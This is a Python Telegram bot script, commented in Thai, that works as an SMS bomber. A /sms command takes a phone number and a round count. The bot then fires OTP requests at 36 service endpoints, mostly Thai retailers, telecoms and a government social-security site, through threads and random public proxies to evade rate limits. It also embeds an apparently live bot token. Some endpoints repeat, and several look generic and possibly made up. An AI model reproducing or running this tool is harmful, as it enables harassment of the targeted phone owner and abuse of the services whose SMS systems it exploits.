import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import requests
import random
import threading
import time

# ตั้งค่าการล็อก
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)

# Proxy List
proxy_list = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text.splitlines()

# API ฟังก์ชัน
def api1(phone):
    try:
        requests.post("https://www.carsome.co.th/website/login/sendSMS",
                      headers={"user-agent": "Mozilla/5.0"},
                      json={"username": phone, "optType": 0},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 1: {e}")

def api2(phone):
    try:
        requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
                                data="mobile=" + phone,
                                proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 2: {e}")

def api3(phone):
    try:
        session = requests.Session()
        session.post("https://srfng.ais.co.th/login/sendOneTimePW",
                     data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
                     proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 3: {e}")

def api4(phone):
    try:
        requests.post("https://openapi.bigc.co.th/customer/v1/otp",
                      headers={"user-agent": "Mozilla/5.0"},
                      json={"phone_no": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 4: {e}")

def api5(phone):
    try:
        requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
                     headers={"user-agent": "Mozilla/5.0"},
                     proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 5: {e}")

def api6(phone):
    try:
        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
                      data={"mobile_phone_no": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 6: {e}")

def api7(phone):
    try:
        requests.post("https://topping.truemoveh.com/api/get_request_otp",
                      data=f"mobile_number={phone}",
                      headers={"Accept": "application/json"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 7: {e}")

def api8(phone):
    try:
        requests.post("https://www.beauticool.com/?m=request_otp",
                      headers={"user-agent": "Mozilla/5.0"},
                      data=f"tel={phone}",
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 8: {e}")

def api9(phone):
    try:
        requests.get(f"https://users.cars24.co.th/oauth/consumer-app/otp/{phone[1:]}",
                     headers={"user-agent": "Mozilla/5.0"},
                     proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 9: {e}")

def api10(phone):
    try:
        requests.post("https://api-sso.ch3plus.com/user/request-otp",
                      headers={'user-agent': "Mozilla/5.0"},
                      json={"tel": phone, "type": "login"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 10: {e}")

def api11(phone):
    try:
        requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",
                      json={"lang": "th", "userType": "BUYER", "locale": "th", "phone": phone, "type": "signup"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 11: {e}")

def api12(phone):
    try:
        requests.post("https://api2.1112.com/api/v1/otp/create",
                      headers={"user-agent": "Mozilla/5.0"},
                      json={"phonenumber": phone, "language": "th"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 12: {e}")

def api13(phone):
    try:
        requests.post("https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp",
                      headers={"User-Agent": "Mozilla/5.0"},
                      data=f"Mobile={phone}",
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 13: {e}")

def api14(phone):
    try:
        requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
                      json={"on": {"value": phone, "country": "66"}, "type": "mobile"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 14: {e}")

def api15(phone):
    try:
        requests.post("https://api.giztix.com/graphql",
                      json={"operationName": "OtpGeneratePhone",
                            "variables": {"phone": f"66{phone[1:]}"},
                            "query": "mutation OtpGeneratePhone($phone: ID!) {otpGeneratePhone(phone: $phone) {ref}}"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 15: {e}")

def api16(phone):
    try:
        requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
                      json={"username": phone, "password": "password", "name": "name", "provinceCode": "28"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 16: {e}")

def api17(phone):
    try:
        requests.post("https://api.ulive.youpik.com/api-base/sms/sendCode",
                      data=f"phone={phone[1:]}&type=1",
                      headers={"authorization": "Basic d2ViQXBwOndlYkFwcA=="},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 17: {e}")

def api18(phone):
    try:
        requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",
                      json={"msisdn": phone, "function": "enroll"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 18: {e}")

def api19(phone):
    try:
        requests.get(f'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code&phone={phone}',
                     proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 19: {e}")

def api20(phone):
    try:
        requests.post("https://api.1112delivery.com/api/v1/otp/create",
                      json={"phonenumber": phone, "language": "th"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 20: {e}")

def api21(phone):
    try:
        requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",
                     proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 21: {e}")

def api22(phone):
    try:
        requests.post("https://www.ctrueshop.com/member.php?page=25&type=9",
                      data=f"tel1={phone}",
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 22: {e}")

def api23(phone):
    try:
        requests.post("https://www.bigthailand.com/authentication-service/user/OTP",
                      json={"locale": "th", "phone": f"+66{phone[1:]}"},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 23: {e}")

def api24(phone):
    try:
        requests.post("https://shopgenix.com/api/sms/otp/",
                      data=f"mobile={phone}",
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 24: {e}")

def api25(phone):
    try:
        requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",
                      json={"Tel": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 25: {e}")

def api26(phone):
    try:
        requests.post("https://id.zilingo.com/api/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 26: {e}")

def api27(phone):
    try:
        requests.post("https://ecomapi.eveandboy.com/v10.0/api/auth/send-otp",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 27: {e}")

def api28(phone):
    try:
        requests.post("https://api.pluckk.in/api/v1/auth/send-otp",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 28: {e}")

def api29(phone):
    try:
        requests.post("https://watsons.co.th/auth/otp",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 29: {e}")

def api30(phone):
    try:
        requests.post("https://app.amplyfy.in/v1/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 30: {e}")

def api31(phone):
    try:
        requests.post("https://line.me/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 31: {e}")

def api32(phone):
    try:
        requests.post("https://scg-api.dingdongx.com/api/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 32: {e}")

def api33(phone):
    try:
        requests.post("https://www.ais.co.th/api/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 33: {e}")

def api34(phone):
    try:
        requests.post("https://www.cpall.co.th/auth/send-otp",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 34: {e}")

def api35(phone):
    try:
        requests.post("https://truemoney.co.th/api/otp/send",
                      json={"phone": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 35: {e}")

def api36(phone):
    try:
        requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",
                      data={"mobile_phone_no": phone},
                      proxies={'http': 'http://' + random.choice(proxy_list)})
    except Exception as e:
        logging.error(f"Error in API 36: {e}")

# ฟังก์ชันที่ยิง SMS แบบรัวๆ ตามจำนวนรอบที่กำหนด
def send_sms(phone, rounds):
    for _ in range(rounds):
        # ยิงทั้งหมด 36 API
        threads = []
        for api in [api1, api2, api3, api4, api5, api6, api7, api8, api9, api10,
                    api11, api12, api13, api14, api15, api16, api17, api18,
                    api19, api20, api21, api22, api23, api24, api25, api26,
                    api27, api28, api29, api30, api31, api32, api33, api34,
                    api35, api36]:
            thread = threading.Thread(target=api, args=(phone,))
            threads.append(thread)
            thread.start()

        # รอให้ทุก thread ทำงานเสร็จ
        for thread in threads:
            thread.join()

# ฟังก์ชันจัดการคำสั่ง /sms
def sms_command(update: Update, context: CallbackContext):
    if len(context.args) != 2:
        update.message.reply_text('กรุณาระบุ เบอร์โทร และ จำนวนรอบที่ต้องการยิง เช่น /sms 0812345678 2')
        return

    phone = context.args[0]
    try:
        rounds = int(context.args[1])  # จำนวนรอบที่ต้องการยิง
        if rounds <= 0:
            update.message.reply_text('โปรดระบุจำนวนรอบที่มากกว่า 0')
            return
    except ValueError:
        update.message.reply_text('โปรดระบุจำนวนรอบที่ถูกต้อง เช่น 1 หรือ 2')
        return

    update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} จำนวน {rounds} รอบ')

    # เริ่มยิง SMS
    threading.Thread(target=send_sms, args=(phone, rounds)).start()

# ฟังก์ชันหลักสำหรับบอท
def main():
    updater = Updater("7291952960:AAF0s9gBMN7pfmha7cRoBsVF1ekgwq_7wHY", use_context=True)
    dispatcher = updater.dispatcher

    # เพิ่มคำสั่ง /sms
    dispatcher.add_handler(CommandHandler("sms", sms_command))

    # เริ่มบอท
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

